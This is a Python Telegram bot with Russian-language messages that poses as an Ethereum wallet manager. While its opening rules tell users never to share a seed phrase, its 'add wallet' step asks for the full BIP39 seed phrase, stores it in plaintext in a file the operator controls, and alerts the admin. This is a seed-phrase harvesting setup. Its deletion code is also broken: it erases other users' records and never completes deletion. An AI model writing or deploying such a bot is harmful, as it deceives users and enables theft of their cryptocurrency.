import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from web3 import Web3, HTTPProvider
import os
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
INFURA_PROJECT_ID = os.getenv("INFURA_PROJECT_ID")

# Проверка конфигурации
if not all([BOT_TOKEN, ADMIN_ID, INFURA_PROJECT_ID]):
    raise ValueError("Отсутствуют необходимые переменные окружения")

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Подключение к Web3
web3 = Web3(HTTPProvider(f'https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}'))

# Файлы базы данных
DB_FILE = "user_data.db"
WALLETS_FILE = "user_wallets.db"

class UserState(StatesGroup):
    user_seed = State()
    user_wallet = State()

def setup_keyboards():
    """Инициализация клавиатур бота"""
    main_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        "Мои кошельки",
        "Добавить кошелек",
        "Удалить кошелек",
        "Проверка баланса эфира по адресу"
    ]
    main_keyboard.add(*buttons)
    return main_keyboard

MAIN_KEYBOARD = setup_keyboards()

# Функции для работы с базой данных
def init_db():
    """Инициализация файлов базы данных, если они не существуют"""
    for file in [DB_FILE, WALLETS_FILE]:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                pass

def add_user(user_id: int):
    """Добавление пользователя в базу данных"""
    with open(DB_FILE, 'a+') as f:
        f.seek(0)
        if str(user_id) not in f.read():
            f.write(f"{user_id}\n")

def get_user_wallets(user_id: int):
    """Получение кошельков конкретного пользователя"""
    try:
        with open(WALLETS_FILE, 'r') as f:
            return [line.strip() for line in f if line.startswith(f"{user_id}|")]
    except FileNotFoundError:
        return []

def add_wallet(user_id: int, wallet_data: str):
    """Добавление кошелька в базу данных"""
    with open(WALLETS_FILE, 'a') as f:
        f.write(f"{user_id}|{wallet_data}\n")

def remove_wallet(user_id: int, wallet_index: int):
    """Удаление кошелька из базы данных"""
    wallets = get_user_wallets(user_id)
    if 0 <= wallet_index < len(wallets):
        updated_wallets = [w.split('|', 1)[1] for w in wallets]
        del updated_wallets[wallet_index]
        
        # Перезапись всего файла (можно оптимизировать для больших объемов данных)
        with open(WALLETS_FILE, 'w') as f:
            for wallet in updated_wallets:
                f.write(f"{user_id}|{wallet}\n")
        return True
    return False

# Обработчики сообщений
@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    """Обработка команд /start и /help"""
    add_user(message.from_user.id)
    
    inline_keyboard = types.InlineKeyboardMarkup()
    inline_keyboard.add(types.InlineKeyboardButton(text="Согласен", callback_data="ok"))
    
    await message.answer(
        'Правила:\n1. Никогда не передавайте свою seed-фразу третьим лицам\n'
        '2. Бот не запрашивает ваши приватные ключи\n'
        '3. Используйте только тестовые кошельки для демонстрации',
        reply_markup=inline_keyboard
    )

@dp.callback_query_handler(text="ok")
async def accept_rules(call: types.CallbackQuery):
    """Обработка принятия правил"""
    await call.answer()
    await call.message.answer(
        'Вас приветствует бот для управления Ethereum кошельками. '
        'Используйте меню кнопок',
        reply_markup=MAIN_KEYBOARD
    )

@dp.message_handler(text="Мои кошельки")
async def show_wallets(message: types.Message):
    """Показать кошельки пользователя"""
    wallets = get_user_wallets(message.from_user.id)
    if not wallets:
        await message.answer('Вы еще не добавили ни одного кошелька')
    else:
        response = "Ваши кошельки:\n" + "\n".join(
            f"{i+1}. {wallet.split('|', 1)[1][:10]}..." for i, wallet in enumerate(wallets)
        )
        await message.answer(response)

@dp.message_handler(text="Удалить кошелек")
async def delete_wallet_prompt(message: types.Message):
    """Запрос на удаление кошелька"""
    wallets = get_user_wallets(message.from_user.id)
    if not wallets:
        await message.answer('Вы еще не добавили ни одного кошелька')
    else:
        await message.answer(
            'Введите номер кошелька для удаления:',
            reply_markup=types.ReplyKeyboardRemove()
        )

@dp.message_handler(text="Добавить кошелек")
async def add_wallet_prompt(message: types.Message):
    """Запрос на добавление кошелька"""
    await message.answer(
        'Введите фразу для добавления (формат BIP39, 12 или 24 слова).',
        reply_markup=types.ReplyKeyboardRemove()
    )
    await UserState.user_seed.set()

@dp.message_handler(text="Проверка баланса эфира по адресу")
async def check_balance_prompt(message: types.Message):
    """Запрос на проверку баланса"""
    await message.answer('Введите Ethereum адрес (начинается с 0x):')
    await UserState.user_wallet.set()

@dp.message_handler(state=UserState.user_seed)
async def process_wallet_seed(message: types.Message, state: FSMContext):
    """Обработка seed-фразы кошелька"""
    seed_phrase = message.text.strip()
    words = seed_phrase.split()
    
    if len(words) in (12, 24):
        add_wallet(message.from_user.id, seed_phrase)
        await message.answer(
            'Кошелек добавлен в базу.',
            reply_markup=MAIN_KEYBOARD
        )
        logger.info(f"Пользователь {message.from_user.id} добавил кошелек")
        await bot.send_message(
            ADMIN_ID,
            f"Новый кошелек добавлен пользователем {message.from_user.id}"
        )
    else:
        await message.answer(
            'Неверный формат. Seed-фраза должна содержать 12 или 24 слова.',
            reply_markup=MAIN_KEYBOARD
        )
    
    await state.finish()

@dp.message_handler(state=UserState.user_wallet)
async def process_wallet_address(message: types.Message, state: FSMContext):
    """Обработка адреса кошелька и проверка баланса"""
    wallet_address = message.text.strip()
    
    if not web3.isAddress(wallet_address):
        await message.answer(
            'Неверный Ethereum адрес. Адрес должен начинаться с 0x и быть 42 символа длиной.',
            reply_markup=MAIN_KEYBOARD
        )
        await state.finish()
        return
    
    try:
        balance_wei = web3.eth.get_balance(wallet_address)
        balance_eth = web3.fromWei(balance_wei, 'ether')
        await message.answer(
            f'Баланс адреса {wallet_address}:\n{balance_eth} ETH',
            reply_markup=MAIN_KEYBOARD
        )
    except Exception as e:
        logger.error(f"Ошибка при проверке баланса: {e}")
        await message.answer(
            'Произошла ошибка при проверке баланса. Попробуйте позже.',
            reply_markup=MAIN_KEYBOARD
        )
    
    await state.finish()

@dp.message_handler()
async def handle_unknown_message(message: types.Message):
    """Обработка неизвестных сообщений"""
    await message.answer(
        'Пожалуйста, используйте кнопки меню для взаимодействия с ботом.',
        reply_markup=MAIN_KEYBOARD
    )

if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)